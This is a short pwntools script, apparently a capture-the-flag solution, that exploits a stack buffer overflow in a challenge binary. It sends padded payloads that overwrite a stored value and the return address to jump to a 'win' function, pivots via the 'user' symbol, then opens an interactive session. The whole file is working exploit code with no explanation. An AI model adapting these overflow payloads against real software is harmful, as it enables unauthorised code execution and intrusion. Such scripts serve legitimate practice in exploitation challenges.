#!/usr/bin/python3

from pwn import *

exe = ELF('challenge_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x401256

        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
GDB()
p.send(b"a"*(108) + p32(0x70) + p64(0x4011f4))
pa = b"a"*88 + flat(0x4011f1, exe.sym.user+0x70) + b'a'*4 + p32(0x70) + p64(exe.sym.win)
p.send(pa)
p.send(b"a"*(108) + p32(0x70) + p64(0x4011f4))
p.send(b'admin\0\0\0'.ljust(108) + p32(0x70) + p64(exe.sym.win))
p.interactive()
